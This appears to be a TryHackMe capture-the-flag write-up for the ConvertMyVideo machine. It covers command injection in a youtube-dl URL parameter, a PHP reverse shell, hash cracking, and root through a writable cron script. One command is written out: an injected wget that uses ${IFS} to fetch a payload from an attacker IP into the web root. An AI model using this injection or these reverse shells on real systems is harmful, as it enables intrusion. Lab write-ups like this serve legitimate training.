---
title: ConvertMyVideo TryHackMe Writeup
tags: [writeup,rest,python,tryhackme,linux,api,suid]
style: border
color: success
description: ""
---


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/1.png)

## Scanning
We launch nmap with scripts and software versions on all ports.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/2.png)

## Enumeration
We access the website, we see that it is a simple application that collects the ID of a youtube video.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/3.png)

We use **dirsearch** and list an interesting directory.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/6.png)

We entry the *"/*******/"* directory and list a basic authentication panel.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/4.png)

We continue reviewing the variable *"yt_url"* of the web application, investigating by Google I find this [github:](https://github.com/ytdl-org/youtube-dl/) where it shows us useful commands.

#### --version

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/7.png)

The **"--exec"** command not working....It seems that there are problems with the coding, looking for a way to solve the problem I discovered a way to be able to execute the **"ls"** command without problems.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/8.png)

Okay, so let's use the payload so we can read the first flag.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/9.png)


## Exploitation
We create a pentestmonkey reverse shell, raise a python server, set a netcat listening and use the following command to obtain a connection on the victim machine.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/10.png)

```bash
<`wget${IFS}10.11.30.149:8000/m3.php${IFS}-O${IFS}/var/www/html/m3.php`
```

#### Reverse shell

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/11.png)

Once we have access to the inside of the machine, we read the file *".htpasswd"* and crack the hash with the dictionary **"rockyou.txt"**.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/12.png)

#### Cracking with JTR

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/13.png)

## Privilege Escalation
After launching several reconnaissance scripts, I end up analyzing the processes that are being executed by the system on a scheduled basis with **pspy** tool and we detect a *"clean.sh"* script running with *"UID=0" (root)*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/14.png)

We check the permissions we have on the file, we see that we can write to it, so we insert a line to invoke a reverse shell with **netcat** and we put another **netcat** listening in our Kali.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/15.png)

We wait a few minutes for the script to run with our malicious code and we will have an interactive connection as root.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/ConvertMyVideo/16.png)




